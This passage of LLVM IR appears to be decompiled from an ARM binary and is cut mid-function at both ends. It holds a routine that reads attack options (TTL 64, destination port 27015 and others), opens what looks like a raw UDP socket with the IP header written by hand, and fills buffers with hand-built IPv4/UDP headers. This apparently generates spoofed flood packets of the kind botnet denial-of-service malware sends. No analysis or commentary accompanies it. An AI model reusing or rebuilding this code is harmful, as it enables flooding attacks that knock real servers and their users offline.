  %v0_d560 = load i32, i32* @r5, align 4
  store i32 %v0_d560, i32* %r1.global-to-local, align 4
  store i32 %v3_d260, i32* %r0.global-to-local, align 4
  %v0_d568 = load i32, i32* @fp, align 4
  store i32 %v0_d568, i32* %r2.global-to-local, align 4
  store i32 16, i32* @r4, align 4
  %v0_d570 = load i32, i32* %ip.global-to-local, align 4
  %v6_d578 = inttoptr i32 %v0_d560 to i32*
  %v7_d578 = call i32 @function_13f2c(i32 %v3_d260, i32* %v6_d578, i32 %v0_d568, i32 16384, i32 %v0_d570, i32 16)
  %v3_d57c = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_d57c, i32* %r3.global-to-local, align 4
  %v1_d580 = add i32 %v3_d57c, 1
  store i32 %v1_d580, i32* %r0.global-to-local, align 4
  %v1_d584 = load i32, i32* @sl, align 4
  %v9_d584 = icmp eq i32 %v1_d580, %v1_d584
  store i1 %v9_d584, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_d580, i32* %stack_var_-40, align 4
  %v5_d58c = icmp slt i32 %v1_d580, %v1_d584
  br i1 %v5_d58c, label %dec_label_pc_d480, label %dec_label_pc_d590

dec_label_pc_d590:                                ; preds = %dec_label_pc_d4e8
  %v2_d590 = icmp eq i32 %v1_d584, 0
  store i1 %v2_d590, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_d470.outer

dec_label_pc_d59c:                                ; preds = %dec_label_pc_d480
  %v1_d59c = add i32 %v2_d488, 16
  %v2_d59c = inttoptr i32 %v1_d59c to i32*
  %v3_d59c = load i32, i32* %v2_d59c, align 4
  %v0_d5a0 = call i32 @function_fe60()
  store i32 %v0_d5a0, i32* %r0.global-to-local, align 4
  %v3_d5a4 = load i32, i32* %stack_var_-40, align 4
  %v5_d5ac = mul i32 %v3_d5a4, 24
  %v1_d5b4 = load i32, i32* @r8, align 4
  %v2_d5b4 = add i32 %v1_d5b4, %v5_d5ac
  store i32 %v2_d5b4, i32* %r1.global-to-local, align 4
  %v1_d5b8 = and i32 %v3_d59c, ptrtoint (i32* @global_var_ff00.24 to i32)
  store i32 %v1_d5b8, i32* %r3.global-to-local, align 4
  %v1_d5b0 = udiv i32 %v3_d59c, 256
  %v3_d5bc = and i32 %v1_d5b0, 65280
  store i32 %v3_d5bc, i32* %r2.global-to-local, align 4
  %v3_d5c0 = mul i32 %v3_d59c, 16777216
  store i32 %v3_d5c0, i32* %ip.global-to-local, align 4
  %v1_d5c4 = add i32 %v2_d5b4, 20
  %v2_d5c4 = inttoptr i32 %v1_d5c4 to i8*
  %v3_d5c4 = load i8, i8* %v2_d5c4, align 1
  %v4_d5c4 = zext i8 %v3_d5c4 to i32
  %v4_d5c8 = mul i32 %v1_d5b8, 256
  %v5_d5c8 = or i32 %v4_d5c8, %v3_d5c0
  store i32 %v5_d5c8, i32* %ip.global-to-local, align 4
  %v4_d5cc = udiv i32 %v3_d59c, 16777216
  %v5_d5cc = or i32 %v3_d5bc, %v4_d5cc
  %v2_d5d0 = or i32 %v5_d5cc, %v5_d5c8
  %v7_d5d4 = lshr i32 %v0_d5a0, %v4_d5c4
  %v8_d5d4 = add i32 %v7_d5d4, %v2_d5d0
  store i32 %v8_d5d4, i32* %r2.global-to-local, align 4
  %v3_d5e0 = mul i32 %v8_d5d4, 16777216
  %v1_d5d8 = mul i32 %v8_d5d4, 256
  %v4_d5e4 = and i32 %v1_d5d8, 16711680
  %v5_d5e4 = or i32 %v4_d5e4, %v3_d5e0
  store i32 %v5_d5e4, i32* %r1.global-to-local, align 4
  store i32 %v6_d24c, i32* %r0.global-to-local, align 4
  %v2_d5f4 = call i32 @llvm.bswap.i32(i32 %v8_d5d4)
  store i32 %v2_d5f4, i32* %r3.global-to-local, align 4
  store i1 %v7_d4a8, i1* %cpsr_z.global-to-local, align 1
  %v1_d5fc = load i32, i32* @r5, align 4
  %v2_d5fc = add i32 %v1_d5fc, 16
  %v3_d5fc = inttoptr i32 %v2_d5fc to i32*
  store i32 %v2_d5f4, i32* %v3_d5fc, align 4
  br i1 %v2_d4a8, label %dec_label_pc_d604, label %dec_label_pc_d4b0

dec_label_pc_d604:                                ; preds = %dec_label_pc_d59c, %dec_label_pc_d4a4
  %v0_d604 = call i32 @function_fe60()
  store i32 %v0_d604, i32* %r0.global-to-local, align 4
  store i32 %v3_d2b8, i32* %r1.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_d614, i1* %cpsr_z.global-to-local, align 1
  %v1_d618 = load i32, i32* @r5, align 4
  %v2_d618 = add i32 %v1_d618, 12
  %v3_d618 = inttoptr i32 %v2_d618 to i32*
  store i32 %v0_d604, i32* %v3_d618, align 4
  br i1 %v3_d614, label %dec_label_pc_d620, label %dec_label_pc_d604.dec_label_pc_d4c4_crit_edge

dec_label_pc_d604.dec_label_pc_d4c4_crit_edge:    ; preds = %dec_label_pc_d604
  %v1_d4c8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_d4c4

dec_label_pc_d620:                                ; preds = %dec_label_pc_d604, %dec_label_pc_d4b0
  %v0_d620 = call i32 @function_fe60()
  %v1_d620 = trunc i32 %v0_d620 to i8
  store i32 %v0_d620, i32* %r0.global-to-local, align 4
  store i32 %v3_d2d4, i32* %r2.global-to-local, align 4
  %v4_d628 = sdiv i32 %v0_d620, 256
  store i32 %v4_d628, i32* %r3.global-to-local, align 4
  %v1_d62c = load i32, i32* @r4, align 4
  %v9_d62c = icmp eq i32 %v3_d2d4, %v1_d62c
  store i1 %v9_d62c, i1* %cpsr_z.global-to-local, align 1
  %v1_d630 = trunc i32 %v4_d628 to i8
  %v2_d630 = load i32, i32* @r5, align 4
  %v3_d630 = add i32 %v2_d630, 5
  %v4_d630 = inttoptr i32 %v3_d630 to i8*
  store i8 %v1_d630, i8* %v4_d630, align 1
  %v3_d634 = load i32, i32* @r5, align 4
  %v4_d634 = add i32 %v3_d634, 4
  %v5_d634 = inttoptr i32 %v4_d634 to i8*
  store i8 %v1_d620, i8* %v5_d634, align 1
  %v0_d638 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_d638, label %dec_label_pc_d63c, label %dec_label_pc_d620.dec_label_pc_d4d0_crit_edge

dec_label_pc_d620.dec_label_pc_d4d0_crit_edge:    ; preds = %dec_label_pc_d620
  %v1_d4d4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_d4d0

dec_label_pc_d63c:                                ; preds = %dec_label_pc_d620, %dec_label_pc_d4c4
  %v0_d63c = call i32 @function_fe60()
  %v1_d63c = trunc i32 %v0_d63c to i8
  store i32 %v0_d63c, i32* %r0.global-to-local, align 4
  %v4_d640 = sdiv i32 %v0_d63c, 256
  store i32 %v4_d640, i32* %r3.global-to-local, align 4
  %v3_d644 = load i32, i32* @r5, align 4
  %v4_d644 = add i32 %v3_d644, 20
  %v5_d644 = inttoptr i32 %v4_d644 to i8*
  store i8 %v1_d63c, i8* %v5_d644, align 1
  %v0_d648 = load i32, i32* %r3.global-to-local, align 4
  %v1_d648 = trunc i32 %v0_d648 to i8
  %v2_d648 = load i32, i32* @r6, align 4
  %v3_d648 = add i32 %v2_d648, 1
  %v4_d648 = inttoptr i32 %v3_d648 to i8*
  store i8 %v1_d648, i8* %v4_d648, align 1
  store i32 %v3_d2d8, i32* %r3.global-to-local, align 4
  %v1_d650 = load i32, i32* @r4, align 4
  %v9_d650 = icmp eq i32 %v3_d2d8, %v1_d650
  store i1 %v9_d650, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_d650, label %dec_label_pc_d658, label %dec_label_pc_d4dc

dec_label_pc_d658:                                ; preds = %dec_label_pc_d63c, %dec_label_pc_d4d0
  %v0_d658 = call i32 @function_fe60()
  %v1_d658 = trunc i32 %v0_d658 to i8
  store i32 %v0_d658, i32* %r0.global-to-local, align 4
  store i32 %v1_d238, i32* %ip.global-to-local, align 4
  %v4_d660 = sdiv i32 %v0_d658, 256
  store i32 %v4_d660, i32* %r3.global-to-local, align 4
  store i1 %v2_d4e0, i1* %cpsr_z.global-to-local, align 1
  %v1_d668 = trunc i32 %v4_d660 to i8
  %v2_d668 = load i32, i32* @r6, align 4
  %v3_d668 = add i32 %v2_d668, 3
  %v4_d668 = inttoptr i32 %v3_d668 to i8*
  store i8 %v1_d668, i8* %v4_d668, align 1
  %v3_d66c = load i32, i32* @r6, align 4
  %v4_d66c = add i32 %v3_d66c, 2
  %v5_d66c = inttoptr i32 %v4_d66c to i8*
  store i8 %v1_d658, i8* %v5_d66c, align 1
  %v0_d670 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_d670, label %dec_label_pc_d4e8, label %dec_label_pc_d674

dec_label_pc_d674:                                ; preds = %dec_label_pc_d4dc, %dec_label_pc_d658
  %v0_d674 = load i32, i32* @r5, align 4
  %v1_d674 = add i32 %v0_d674, 28
  store i32 %v1_d674, i32* %r0.global-to-local, align 4
  store i32 %v0_d2b0, i32* @r1, align 4
  %v1_d67c = inttoptr i32 %v1_d674 to i8*
  %v2_d67c = call i32 @function_1003c(i8* %v1_d67c)
  store i32 %v2_d67c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_d4e8

dec_label_pc_d684:                                ; preds = %dec_label_pc_d270
  store i32 %v3_d260, i32* %r0.global-to-local, align 4
  %v1_d688 = call i32 @function_1369c(i32 %v3_d260)
  store i32 %v1_d688, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_d68c

dec_label_pc_d68c:                                ; preds = %dec_label_pc_d124, %dec_label_pc_d684
  %v29_d690 = phi i32 [ %v3_d260, %dec_label_pc_d124 ], [ %v1_d688, %dec_label_pc_d684 ]
  store i32 %v18_d124, i32* %sb.global-to-local, align 4
  store i32 %v24_d124, i32* %fp.global-to-local, align 4
  ret i32 %v29_d690

dec_label_pc_d694:                                ; preds = %dec_label_pc_d2f4
  %v3_d698 = sext i8 %v5_d358 to i32
  %v7_d698 = sext i8 %v5_d35c to i32
  %v3_d69c = sdiv i32 %v3_d698, 256
  store i32 %v3_d69c, i32* %r0.global-to-local, align 4
  %v3_d6a0 = sdiv i32 %v7_d698, 256
  store i32 %v3_d6a0, i32* %r1.global-to-local, align 4
  store i32 %v1_d330, i32* %r2.global-to-local, align 4
  store i32 %v1_d334, i32* %r3.global-to-local, align 4
  %v3_d6ac34 = udiv i32 %v1_d34c, 256
  store i32 %v3_d6ac34, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r6, align 4
  %v4_d718 = sext i8 %v5_d1b4 to i32
  %sext11 = mul i32 %v1_d34c, 65536
  %v4_d770 = sdiv i32 %sext11, 16777216
  %sext12 = mul i32 %v0_d2c4, 16777216
  %v4_d774 = sdiv i32 %sext12, 16777216
  %sext13 = mul i32 %v0_d2c0, 16777216
  %v4_d790 = sdiv i32 %sext13, 16777216
  %v1_d77c = trunc i32 %v3_d6a0 to i8
  %v1_d798 = trunc i32 %v4_d790 to i8
  br label %dec_label_pc_d6c8

dec_label_pc_d6c8:                                ; preds = %dec_label_pc_d6c8, %dec_label_pc_d694
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_d6d4 = call i32 @function_14294(i32 1510, i32 1)
  store i32 %v2_d6d4, i32* %r0.global-to-local, align 4
  store i32 %v2_d144, i32* %r1.global-to-local, align 4
  %v3_d6dc = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_d6dc, i32* %r2.global-to-local, align 4
  %v2_d6e0 = load i32, i32* @r6, align 4
  %v5_d6e0 = mul i32 %v2_d6e0, 4
  %v6_d6e0 = add i32 %v5_d6e0, %v2_d144
  %v7_d6e0 = inttoptr i32 %v6_d6e0 to i32*
  store i32 %v2_d6d4, i32* %v7_d6e0, align 4
  %v0_d6e4 = load i32, i32* %r1.global-to-local, align 4
  %v1_d6e4 = load i32, i32* %r2.global-to-local, align 4
  %v4_d6e4 = mul i32 %v1_d6e4, 4
  %v5_d6e4 = add i32 %v4_d6e4, %v0_d6e4
  %v6_d6e4 = inttoptr i32 %v5_d6e4 to i32*
  %v7_d6e4 = load i32, i32* %v6_d6e4, align 4
  store i32 %v7_d6e4, i32* %r1.global-to-local, align 4
  %v1_d6e8 = inttoptr i32 %v7_d6e4 to i8*
  %v2_d6e8 = load i8, i8* %v1_d6e8, align 1
  %tmp86 = urem i8 %v2_d6e8, 16
  %v1_d6ec = zext i8 %tmp86 to i32
  %v1_d6f0 = or i32 %v1_d6ec, 64
  store i32 %v1_d6f0, i32* %r3.global-to-local, align 4
  %v1_d6f4 = trunc i32 %v1_d6f0 to i8
  store i8 %v1_d6f4, i8* %v1_d6e8, align 1
  %v0_d6f8 = load i32, i32* %r1.global-to-local, align 4
  %v1_d6f8 = inttoptr i32 %v0_d6f8 to i8*
  %v2_d6f8 = load i8, i8* %v1_d6f8, align 1
  %v3_d6f8 = zext i8 %v2_d6f8 to i32
  %v1_d6fc = and i32 %v3_d6f8, 240
  %v1_d700 = or i32 %v1_d6fc, 5
  store i32 %v1_d700, i32* %r2.global-to-local, align 4
  %v3_d708 = add i32 %v0_d6f8, 9
  %v4_d708 = inttoptr i32 %v3_d708 to i8*
  store i8 17, i8* %v4_d708, align 1
  %v0_d70c = load i32, i32* %r2.global-to-local, align 4
  %v1_d70c = trunc i32 %v0_d70c to i8
  %v2_d70c = load i32, i32* %r1.global-to-local, align 4
  %v3_d70c = inttoptr i32 %v2_d70c to i8*
  store i8 %v1_d70c, i8* %v3_d70c, align 1
  %v2_d714 = load i32, i32* %r1.global-to-local, align 4
  %v3_d714 = add i32 %v2_d714, 1
  %v4_d714 = inttoptr i32 %v3_d714 to i8*
  store i8 %v5_d17c, i8* %v4_d714, align 1
  store i32 %v4_d718, i32* %r0.global-to-local, align 4
  %v2_d71c = load i32, i32* %r1.global-to-local, align 4
  %v3_d71c = add i32 %v2_d71c, 8
  %v4_d71c = inttoptr i32 %v3_d71c to i8*
  store i8 %v5_d1b4, i8* %v4_d71c, align 1
  %v3_d720 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_d720, i32* %r2.global-to-local, align 4
  store i32 %v6_d24c, i32* %ip.global-to-local, align 4
  %v3_d728 = mul i32 %v3_d720, 32
  store i32 %v3_d728, i32* %r3.global-to-local, align 4
  %v1_d72c = load i32, i32* %r1.global-to-local, align 4
  %v2_d72c = add i32 %v1_d72c, 12
  %v3_d72c = inttoptr i32 %v2_d72c to i32*
  store i32 %v6_d24c, i32* %v3_d72c, align 4
  %v0_d730 = load i32, i32* %r3.global-to-local, align 4
  %v1_d730 = load i32, i32* %r2.global-to-local, align 4
  %tmp87 = mul i32 %v1_d730, -8
  %v5_d730 = add i32 %v0_d730, %tmp87
  %v1_d734 = load i32, i32* @r8, align 4
  %v2_d734 = add i32 %v5_d730, %v1_d734
  store i32 %v2_d734, i32* %r3.global-to-local, align 4
  %v1_d738 = add i32 %v2_d734, 16
  %v2_d738 = inttoptr i32 %v1_d738 to i32*
  %v3_d738 = load i32, i32* %v2_d738, align 4
  store i32 %v3_d738, i32* %ip.global-to-local, align 4
  %v1_d73c = add i32 %v1_d730, 1
  store i32 %v1_d73c, i32* @r6, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_d748 = load i32, i32* %r1.global-to-local, align 4
  %v3_d748 = add i32 %v2_d748, 6
  %v4_d748 = inttoptr i32 %v3_d748 to i8*
  store i8 64, i8* %v4_d748, align 1
  %v0_d74c = load i32, i32* %r2.global-to-local, align 4
  %v1_d74c = trunc i32 %v0_d74c to i8
  %v2_d74c = load i32, i32* %r1.global-to-local, align 4
  %v3_d74c = add i32 %v2_d74c, 7
  %v4_d74c = inttoptr i32 %v3_d74c to i8*
  store i8 %v1_d74c, i8* %v4_d74c, align 1
  %v0_d750 = load i32, i32* %ip.global-to-local, align 4
  %v1_d750 = load i32, i32* %r1.global-to-local, align 4
  %v2_d750 = add i32 %v1_d750, 16
  %v3_d750 = inttoptr i32 %v2_d750 to i32*
  store i32 %v0_d750, i32* %v3_d750, align 4
  store i32 %v3_d69c, i32* %r3.global-to-local, align 4
  store i32 %v7_d698, i32* %ip.global-to-local, align 4
  %v2_d760 = load i32, i32* %r1.global-to-local, align 4
  %v3_d760 = add i32 %v2_d760, 2
  %v4_d760 = inttoptr i32 %v3_d760 to i8*
  store i8 %v5_d358, i8* %v4_d760, align 1
  %v0_d764 = load i32, i32* %r3.global-to-local, align 4
  %v1_d764 = trunc i32 %v0_d764 to i8
  %v2_d764 = load i32, i32* %r1.global-to-local, align 4
  %v3_d764 = add i32 %v2_d764, 3
  %v4_d764 = inttoptr i32 %v3_d764 to i8*
  store i8 %v1_d764, i8* %v4_d764, align 1
  %v0_d768 = load i32, i32* %ip.global-to-local, align 4
  %v1_d768 = trunc i32 %v0_d768 to i8
  %v2_d768 = load i32, i32* %r1.global-to-local, align 4
  %v3_d768 = add i32 %v2_d768, 4
  %v4_d768 = inttoptr i32 %v3_d768 to i8*
  store i8 %v1_d768, i8* %v4_d768, align 1
  store i32 %v3_d6a0, i32* %r2.global-to-local, align 4
  store i32 %v4_d770, i32* %r3.global-to-local, align 4
  store i32 %v4_d774, i32* %ip.global-to-local, align 4
  %v0_d778 = load i32, i32* %r1.global-to-local, align 4
  %v1_d778 = add i32 %v0_d778, 20
  store i32 %v1_d778, i32* %r0.global-to-local, align 4
  %v3_d77c = add i32 %v0_d778, 5
  %v4_d77c = inttoptr i32 %v3_d77c to i8*
  store i8 %v1_d77c, i8* %v4_d77c, align 1
  %v0_d780 = load i32, i32* @r4, align 4
  %v1_d780 = trunc i32 %v0_d780 to i8
  %v2_d780 = load i32, i32* %r1.global-to-local, align 4
  %v3_d780 = add i32 %v2_d780, 20
  %v4_d780 = inttoptr i32 %v3_d780 to i8*
  store i8 %v1_d780, i8* %v4_d780, align 1
  %v0_d784 = load i32, i32* %r3.global-to-local, align 4
  %v1_d784 = trunc i32 %v0_d784 to i8
  %v2_d784 = load i32, i32* %r0.global-to-local, align 4
  %v3_d784 = add i32 %v2_d784, 5
  %v4_d784 = inttoptr i32 %v3_d784 to i8*
  store i8 %v1_d784, i8* %v4_d784, align 1
  %v0_d788 = load i32, i32* %ip.global-to-local, align 4
  %v1_d788 = trunc i32 %v0_d788 to i8
  %v2_d788 = load i32, i32* %r0.global-to-local, align 4
  %v3_d788 = add i32 %v2_d788, 1
  %v4_d788 = inttoptr i32 %v3_d788 to i8*
  store i8 %v1_d788, i8* %v4_d788, align 1
  %v0_d78c = load i32, i32* @r5, align 4
  %v1_d78c = trunc i32 %v0_d78c to i8
  %v2_d78c = load i32, i32* %r0.global-to-local, align 4
  %v3_d78c = add i32 %v2_d78c, 2
  %v4_d78c = inttoptr i32 %v3_d78c to i8*
  store i8 %v1_d78c, i8* %v4_d78c, align 1
  store i32 %v4_d790, i32* %r1.global-to-local, align 4
  %v0_d794 = load i32, i32* @r6, align 4
  %v1_d794 = load i32, i32* @sl, align 4
  %v9_d794 = icmp eq i32 %v0_d794, %v1_d794
  store i1 %v9_d794, i1* %cpsr_z.global-to-local, align 1
  %v2_d798 = load i32, i32* %r0.global-to-local, align 4
  %v3_d798 = add i32 %v2_d798, 3
  %v4_d798 = inttoptr i32 %v3_d798 to i8*
  store i8 %v1_d798, i8* %v4_d798, align 1
  %v0_d79c = load i32, i32* @r7, align 4
  %v1_d79c = trunc i32 %v0_d79c to i8
  %v2_d79c = load i32, i32* %r0.global-to-local, align 4
  %v3_d79c = add i32 %v2_d79c, 4
  %v4_d79c = inttoptr i32 %v3_d79c to i8*
  store i8 %v1_d79c, i8* %v4_d79c, align 1
  %v0_d7a0 = load i32, i32* @r6, align 4
  store i32 %v0_d7a0, i32* %stack_var_-40, align 4
  %v5_d7a4 = icmp slt i32 %v0_d794, %v1_d794
  br i1 %v5_d7a4, label %dec_label_pc_d6c8, label %dec_label_pc_d468

; uselistorder directives
  uselistorder i32 %v1_d730, { 1, 0 }
  uselistorder i32 %v3_d6a0, { 2, 1, 0 }
  uselistorder i32 %v3_d69c, { 1, 0 }
  uselistorder i32 %v7_d698, { 1, 0 }
  uselistorder i32 %v4_d660, { 1, 0 }
  uselistorder i32 %v0_d658, { 0, 2, 1 }
  uselistorder i32 %v0_d63c, { 0, 2, 1 }
  uselistorder i32 %v4_d628, { 1, 0 }
  uselistorder i32 %v0_d620, { 0, 2, 1 }
  uselistorder i32 %v2_d5f4, { 1, 0 }
  uselistorder i32 %v8_d5d4, { 2, 0, 1, 3 }
  uselistorder i32 %v3_d5c0, { 1, 0 }
  uselistorder i32 %v3_d59c, { 2, 3, 1, 0 }
  uselistorder i1 %v2_d590, { 1, 0 }
  uselistorder i32 %v1_d584, { 1, 2, 3, 0 }
  uselistorder i32 %v1_d580, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v4_d528, { 0, 2, 1 }
  uselistorder i32 %v0_d510, { 1, 0, 2, 3 }
  uselistorder i32 %v4_d4fc, { 1, 0 }
  uselistorder i32 %v2_d4f8, { 0, 2, 1 }
  uselistorder i1 %v7_d4a8, { 2, 1, 0 }
  uselistorder i1 %v3_d614, { 1, 0, 2, 3 }
  uselistorder i32 %v3_d36c36, { 1, 0 }
  uselistorder i8 %v5_d358, { 0, 2, 1 }
  uselistorder i32 %v3_d344, { 1, 0 }
  uselistorder i32 %v1_d334, { 2, 3, 0, 1 }
  uselistorder i32 %v1_d330, { 1, 2, 0 }
  uselistorder i32 %v1_d328, { 1, 0, 2 }
  uselistorder i32 %v1_d320, { 1, 0 }
  uselistorder i32 %v1_d2f8, { 1, 0, 2 }
  uselistorder i32 %v3_d2d8, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v3_d2b8, { 2, 1, 4, 3, 0 }
  uselistorder i32 %v0_d2b4, { 0, 2, 1, 4, 3 }
  uselistorder i32 %v0_d2b0, { 3, 0, 4, 1, 2 }
  uselistorder i32 %v3_d2a4, { 3, 1, 2, 0 }
  uselistorder i1 %v7_d290, { 1, 0 }
  uselistorder i1 %v7_d264, { 1, 0 }
  uselistorder i32 %v3_d260, { 1, 3, 4, 5, 6, 2, 0, 7 }
  uselistorder i32 %v6_d24c, { 2, 1, 7, 5, 0, 6, 4, 3 }
  uselistorder i32 %v1_d238, { 3, 1, 2, 0 }
  uselistorder i32 %v1_d1c4, { 1, 0 }
  uselistorder i8 %v5_d1b4, { 1, 0, 2 }
  uselistorder i32 %v5_d198, { 1, 0 }
  uselistorder i8 %v5_d17c, { 0, 2, 1 }
  uselistorder i32 %v6_d15c, { 1, 0 }
  uselistorder i32 %v2_d144, { 0, 3, 1, 5, 2, 4 }
  uselistorder i32 %v1_d128, { 2, 1, 0 }
  uselistorder i32* %stack_var_-40, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 0, 14, 13 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 39, 38, 40, 41, 42, 43, 44, 45, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 14, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 45, 44, 46, 48, 47, 49, 50, 52, 51, 54, 53, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 10, 8, 9, 12, 11, 14, 13, 15, 16, 17, 19, 18, 21, 20, 22, 24, 23, 30, 25, 26, 27, 28, 29, 35, 31, 32, 33, 34, 36, 38, 37, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 0 }
  uselistorder i32 240, { 1, 0 }
  uselistorder label %dec_label_pc_d68c, { 1, 0 }
  uselistorder label %dec_label_pc_d674, { 1, 0 }
  uselistorder label %dec_label_pc_d4e8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_d470, { 1, 0 }
  uselistorder label %bb74, { 1, 0 }
  uselistorder label %bb71, { 1, 0 }
}

define i32 @function_d7b0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_d7b0:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_d7b0 = load i32, i32* @r4, align 4
  %v12_d7b0 = load i32, i32* @r7, align 4
  %v1_d7b4 = urem i32 %arg1, 256
  store i32 %v1_d7b4, i32* %sb.global-to-local, align 4
  store i32 %arg2, i32* @sl, align 4
  %v1_d7c8 = urem i32 %arg3, 256
  store i32 %v1_d7c8, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  %v2_d7d0 = call i32 @function_14294(i32 %v1_d7b4, i32 4)
  %v0_d7d4 = load i32, i32* @r5, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_d7e0 = load i32, i32* @r4, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v5_d7e8 = inttoptr i32 %v0_d7d4 to i32*
  %v6_d7e8 = call i32 @function_a4e8(i32 %v0_d7e0, i32* %v5_d7e8, i32 2, i32 0)
  %v1_d7f4 = urem i32 %v6_d7e8, 256
  store i32 %v1_d7f4, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_d800 = load i32, i32* @r4, align 4
  %v0_d804 = load i32, i32* @r5, align 4
  %v5_d808 = trunc i32 %v6_d7e8 to i8
  %v6_d80c = inttoptr i32 %v0_d804 to i32*
  %v7_d80c = call i32 @function_a4e8(i32 %v0_d800, i32* %v6_d80c, i32 3, i32 65535)
  %v0_d810 = load i32, i32* @r5, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_d80c, i32* @r7, align 4
  %v0_d820 = load i32, i32* @r4, align 4
  %v4_d824 = inttoptr i32 %v0_d810 to i32*
  %v5_d824 = call i32 @function_a4e8(i32 %v0_d820, i32* %v4_d824, i32 4, i32 64)
  %v1_d82c = urem i32 %v5_d824, 256
  store i32 %v1_d82c, i32* %ip.global-to-local, align 4
  %v0_d830 = load i32, i32* @r5, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_d83c = load i32, i32* @r4, align 4
  %v5_d840 = trunc i32 %v5_d824 to i8
  %v6_d844 = inttoptr i32 %v0_d830 to i32*
  %v7_d844 = call i32 @function_a4e8(i32 %v0_d83c, i32* %v6_d844, i32 5, i32 0)
  %v1_d850 = urem i32 %v7_d844, 256
  store i32 %v1_d850, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_d85c = load i32, i32* @r4, align 4
  %v0_d860 = load i32, i32* @r5, align 4
  %v5_d868 = inttoptr i32 %v0_d860 to i32*
  %v6_d868 = call i32 @function_a4e8(i32 %v0_d85c, i32* %v5_d868, i32 6, i32 65535)
  store i32 27015, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_d878 = load i32, i32* @r5, align 4
  store i32 %v6_d868, i32* @r6, align 4
  %v0_d880 = load i32, i32* @r4, align 4
  %v4_d884 = inttoptr i32 %v0_d878 to i32*
  %v5_d884 = call i32 @function_a4e8(i32 %v0_d880, i32* %v4_d884, i32 7, i32 27015)
  store i32 %v5_d884, i32* @r4, align 4
  %v1_d890 = call i32 @function_123b0(i32 29)
  %v3_d89c = call i32 @function_122cc(i32 29, i32* nonnull %stack_var_-44)
  store i32 %v3_d89c, i32* %r8.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  %v3_d8b0 = call i32 @function_13f90(i32 2, i32 3, i32 17)
  %v7_d8b4 = icmp eq i32 %v3_d8b0, -1
  store i1 %v7_d8b4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_d8b0, i32* %fp.global-to-local, align 4
  br i1 %v7_d8b4, label %dec_label_pc_dc68, label %dec_label_pc_d8c0

dec_label_pc_d8c0:                                ; preds = %dec_label_pc_d7b0
  store i32 1, i32* %stack_var_-40, align 4
  %v6_d8c8 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v6_d8c8, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v6_d8dc = call i32 @function_13f60(i32 %v3_d8b0, i32 0, i32 3, i32* nonnull %stack_var_-40, i32 ptrtoint (i32* @0 to i32))
  %v7_d8e0 = icmp eq i32 %v6_d8dc, -1
  store i1 %v7_d8e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_d8e0, label %dec_label_pc_dc60, label %dec_label_pc_d8e8

